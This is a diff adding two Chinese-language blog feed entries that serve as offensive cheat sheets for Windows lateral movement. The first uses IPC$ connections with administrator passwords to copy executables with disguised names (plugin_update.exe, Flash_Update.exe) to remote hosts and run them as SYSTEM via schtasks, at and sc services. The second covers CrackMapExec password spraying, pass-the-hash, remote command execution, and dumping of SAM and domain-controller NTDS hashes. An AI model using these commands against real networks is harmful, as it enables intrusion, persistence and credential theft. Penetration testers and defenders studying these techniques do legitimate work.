+<h3 id="建立空连接">建立空连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ &quot;&quot; /u:&quot;&quot;
+</code></pre>
+<h3 id="建立正常连接">建立正常连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ &quot;1qaz@WSX&quot; /user:&quot;Administrator&quot; 
+</code></pre>
+<h3 id="查看已建立连接目标主机的共享资源">查看已建立连接目标主机的共享资源</h3>
+<pre><code>net view \\192.168.1.1
+</code></pre>
+<h3 id="查看目标主机时间">查看目标主机时间</h3>
+<pre><code>net time \\192.168.1.1
+</code></pre>
+<h3 id="删除本机与指定ip建立的连接">删除本机与指定ip建立的连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ /del /y
+</code></pre>
+<h3 id="删除本机所有已建立的连接">删除本机所有已建立的连接</h3>
+<pre><code>net use * /del /y
+</code></pre>
+<h3 id="文件的上传下载与删除">文件的上传下载与删除</h3>
+<pre><code>copy plugin_update.exe \\192.168.1.1\c$\windows\temp\plugin_update.exe
+[推荐用xcopy]:
+xcopy d:\sqlitedata\*.* \\192.168.1.1\c$\temp /E /Y /D
+（上传本地文件到目标的:c\windows\temp\目录下）
+copy \\192.168.1.1\c$\plugin_update.exe c:\
+（下载目标文件到本地c盘下）
+del \\192.168.1.1\c$\plugin_update.exe /F
+（删除目标文件）
+</code></pre>
+<h3 id="创建计划任务之schtasks">创建计划任务之schtasks</h3>
+<pre><code>schtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 16:32 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+
+补充1：schtasks /create /tn &quot;Flash_Update&quot; /tr C:\Users\Public\Flash_Update.exe /sc minute /mo 1 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+
+立即执行计划任务
+schtasks /run /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;
+
+删除计划任务
+schtasks /F /delete /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;
+
+计划任务远程开启默认共享{注意查看目标主机时间}
+schtasks /create /tn &quot;plugin_update&quot; /tr &quot;cmd /c net share c$=c:&quot; /sc once /st 16:25 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+</code></pre>
+<h3 id="创建计划任务之at">创建计划任务之at</h3>
+<pre><code>（at只支持win03和部分老版本win08，一般情况下，win08-SP1的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）
+
+at \\192.168.1.1 14:05 cmd /c &quot;c:\windows\temp\test.bat&quot; 
+</code></pre>
+<h3 id="sc创建服务">SC创建服务</h3>
+<pre><code>（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报1053错误）
+sc \\192.168.1.1 create shellsrv binpath= &quot;c:\shell.exe&quot; start= auto displayname= &quot;shellstart&quot;
+
+sc \\192.168.1.1 create test binpath= &quot;c:\windows\temp\test.bat&quot; start= auto displayname= &quot;shellstart&quot;
+
+sc \\192.168.1.1 start shllsrv
+sc \\192.168.1.1 stop shllsrv
+sc \\192.168.1.1 delete shellsrv
+</code></pre>
+<h3 id="删除默认共享">删除默认共享</h3>
+<pre><code>net share c$ /del
+</code></pre>
+<h3 id="恢复默认共享">恢复默认共享</h3>
+<pre><code>net share c$=c:
+</code></pre>
+<h3 id="对方的c盘映射为自己的z盘其他盘类推不推荐">对方的c盘映射为自己的z盘，其他盘类推(不推荐)</h3>
+<pre><code>net use z: \\192.168.1.1\c$ &quot;1qaz@WSX&quot; /user:&quot;administrator&quot;
+</code></pre>
+<h3 id="删除映射的c盘其他盘类推">删除映射的c盘，其他盘类推</h3>
+<pre><code>net use c: /del
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Crackmapexec]]></title>
+        <id>https://cx-reboot.github.io/post/crackmapexec/</id>
+        <link href="https://cx-reboot.github.io/post/crackmapexec/">
+        </link>
+        <updated>2023-05-06T10:38:00.000Z</updated>
+        <content type="html"><![CDATA[<p>官网：https://github.com/Porchetta-Industries/CrackMapExec<br>
+Windows 版本：https://github.com/maaaaz/CrackMapExecWin</p>
+<p>参考文章：</p>
+<ul>
+<li>https://cangqingzhe.github.io/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</li>
+<li>ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/</li>
+<li></li>
+</ul>
+<h2 id="目标格式">目标格式</h2>
+<p>每个协议都支持以CIDR表示法，IP地址，IP范围，主机名或包含目标列表的文件格式。</p>
+<pre><code>crackmapexec &lt;protocol&gt; ms.evilcorp.org
+
+crackmapexec &lt;protocol&gt; 192.168.1.0 192.168.0.2
+
+crackmapexec &lt;protocol&gt; 192.168.1.0/24
+
+crackmapexec &lt;protocol&gt; 192.168.1.0-28 10.0.0.1-67
+
+crackmapexec &lt;protocol&gt; ~/targets.txt
+</code></pre>
+<h2 id="支持协议">支持协议</h2>
+<pre><code>    ssh                 own stuff using SSH
+    smb                 own stuff using SMB
+    ldap                own stuff using LDAP
+    winrm               own stuff using WINRM
+    mssql               own stuff using MSSQL
+</code></pre>
+<h2 id="使用凭据">使用凭据</h2>
+<pre><code>crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username -p password
+
+crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username -p 'Admin!123@'
+
+</code></pre>
+<h3 id="爆破喷洒">爆破&amp;喷洒</h3>
+<pre><code>crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 -p password1 password2
+
+crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 username2 -p password1
+
+crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u ~/file_containing_usernames -p ~/file_containing_passwords
+
+crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
+</code></pre>
+<h2 id="常见使用方法">常见使用方法</h2>
+<h3 id="网络枚举扫描">网络枚举&amp;扫描</h3>
+<pre><code>crackmapexec 192.168.1.1/24
+</code></pre>
+<h3 id="命令执行">命令执行</h3>
+<pre><code>crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+</code></pre>
+<h4 id="smb执行命令">SMB执行命令</h4>
+<pre><code>crackmapexec.exe -d medtech.com -u administrator -p xxx -t 1 host.txt --execm smbexec -x &quot;whoami /user&quot;
+</code></pre>
+<h4 id="wmi-执行命令">WMI 执行命令</h4>
+<pre><code>crackmapexec.exe -d medtech.com -u administrator -p xxxx -t 1 host.txt --execm wmi -x &quot;whoami /user&quot;
+</code></pre>
+<h3 id="dump-hashs">Dump Hashs</h3>
+<pre><code>crackmapexec.exe -d . -u administrator -H xxxx:xxxx -t 1 --sam  host.txt
+</code></pre>
+<h4 id="导出域控hash">导出域控Hash</h4>
+<pre><code>crackmapexec.exe -d rootkit -u administrator -p xxx -t 1 192.168.3.144 --ntds vss
+</code></pre>
+]]></content>
+    </entry>
+</feed>
